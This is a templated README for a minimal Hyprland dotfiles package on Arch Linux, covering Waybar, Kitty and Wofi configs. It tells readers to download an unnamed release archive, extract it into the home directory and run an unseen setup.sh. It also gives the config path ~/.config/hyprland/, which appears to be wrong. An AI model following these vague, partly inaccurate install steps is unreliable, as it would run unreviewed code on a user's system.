---
layout: "default"
title: "🎉 dotfiles-hyprland - Simple Setup for Hyprland Experience"
description: "❄️ Optimize your workflow with minimal Hyprland dotfiles for a clean, fast, and keyboard-driven experience on Arch Linux."
---
# 🎉 dotfiles-hyprland - Simple Setup for Hyprland Experience

## 📥 Download Now
[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/parissproxy23/dotfiles-hyprland/releases)

## 📖 Table of Contents
- [📝 Description](#-description)
- [⚙️ Features](#-features)
- [🚀 Getting Started](#-getting-started)
- [📦 Download & Install](#-download--install)
- [🏁 Running the Application](#-running-the-application)
- [📞 Support](#-support)

## 📝 Description
Welcome to the **dotfiles-hyprland** project. This package offers a set of minimal dotfiles designed for the Hyprland desktop environment. With easy configurations for applications like Waybar, Kitty, and Wofi, you can quickly enhance your user experience. Ideal for anyone looking to customize their Linux setup.

## ⚙️ Features
- **Minimalistic Design**: A clean interface ensures a distraction-free environment.
- **Waybar Configuration**: Simple settings for easy access to system information.
- **Kitty Integration**: Quick access to a sleek terminal experience.
- **Wofi Support**: Streamlined application launcher for quick navigation.
- **Customization Options**: Change themes and settings easily to match your style. 

## 🚀 Getting Started
To use these dotfiles, you need to be on an Arch Linux system with Hyprland installed. Here are the steps to get started:

1. **Ensure Arch Linux is Installed**: This package is designed specifically for Arch Linux users. Check that your system is up-to-date by running the following command in your terminal:
   ```bash
   sudo pacman -Syu
   ```

2. **Install Hyprland**: Make sure you have the Hyprland desktop environment installed. You can follow the official installation guide or use the terminal:
   ```bash
   sudo pacman -S hyprland
   ```

## 📦 Download & Install
To download the latest release of the dotfiles, please visit this page: [Download dotfiles-hyprland](https://github.com/parissproxy23/dotfiles-hyprland/releases).

1. Click on the link to go to the Releases page.
2. Locate the latest version under "Assets" and click the download link for the dotfiles.
3. Save the file to a directory of your choice.

Once downloaded, extract the contents to your home directory:

```bash
tar -xvf dotfiles-hyprland.tar.gz -C ~/
```

You may replace `dotfiles-hyprland.tar.gz` with the actual filename if it differs.

## 🏁 Running the Application
To set up and use your dotfiles:

1. **Open a Terminal**: You can use the Kitty terminal included in the package.
2. **Navigate to Your Home Directory**:
   ```bash
   cd ~/
   ```
3. **Run the Setup Script**: If the package includes a setup script, execute this command:
   ```bash
   ./setup.sh
   ```
   This script will configure your environment based on the dotfiles you downloaded.

4. **Start Hyprland**: Log out of your current session and log back in to start using Hyprland.

5. **Customize Your Settings**: Explore the configuration files located in `~/.config/hyprland/`, `~/.config/waybar/`, and `~/.config/kitty/`. You can modify these files to personalize your user experience.

## 📞 Support
If you encounter any issues or need further assistance, please consult the **Issues** section of the GitHub repository. You can also reach out to the community for support and ideas on using dotfiles-hyprland effectively.

Thank you for choosing **dotfiles-hyprland**! Enjoy your personalized Linux experience.